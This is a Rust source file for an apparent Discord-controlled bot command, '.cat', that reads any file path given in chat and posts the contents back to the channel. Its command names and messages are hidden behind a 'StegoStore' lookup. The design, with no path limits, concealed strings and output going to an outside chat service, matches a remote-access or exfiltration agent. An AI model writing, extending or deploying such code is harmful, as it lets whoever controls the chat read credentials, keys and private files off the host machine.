use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::fs;
use std::path::Path;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct CatCommand;

impl CatCommand {
    fn f(key: &str) -> String { StegoStore::get(StringCategory::Filesystem, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for CatCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("CAT_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "CAT").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_FS").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("CAT_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".cat config.txt", ".cat /path/to/file.log"].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("CAT_ALIAS1").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
        let file_path_owned = args.rest();
        let file_path = file_path_owned.trim();

        if file_path.is_empty() {
            http.create_message(msg.channel_id.get(), &format!("{}: {}. {}: {}", Self::f("PATH_NOT_FOUND"), Self::f("ERR_PROVIDE_PATH"), StegoStore::get(StringCategory::Core, "USAGE"), Self::c("CAT_USAGE"))).await?;
            return Ok(());
        }

        let path = Path::new(file_path);

        if !path.exists() {
            http.create_message(msg.channel_id.get(), &format!("{}: `{}`", Self::f("PATH_NOT_FOUND"), file_path)).await?;
            return Ok(());
        }

        if !path.is_file() {
            http.create_message(msg.channel_id.get(), &format!("{}: `{}`", Self::f("ERR_PATH_NOT_FILE"), file_path)).await?;
            return Ok(());
        }

        match fs::read_to_string(path) {
            Ok(content) => {
                // Discord has a 2000 character limit for messages
                if content.len() > 1900 {
                    let truncated = &content[..1900];
                    http.create_message(msg.channel_id.get(), &format!(
                            "{}\n```\n{}\n```",
                            Self::f("CAT_TRUNCATED"),
                            truncated
                        )).await?;
                } else {
                    http.create_message(msg.channel_id.get(), &format!("{}\n```\n{}\n```", Self::f("CAT_CONTENTS"), content)).await?;
                }
            }
            Err(e) => {
                http.create_message(msg.channel_id.get(), &format!(
                        "{}: `{}`: {}",
                        Self::f("CAT_ERR_READ"),
                        file_path, e
                    )).await?;
            }
        }

        Ok(())
    }
}


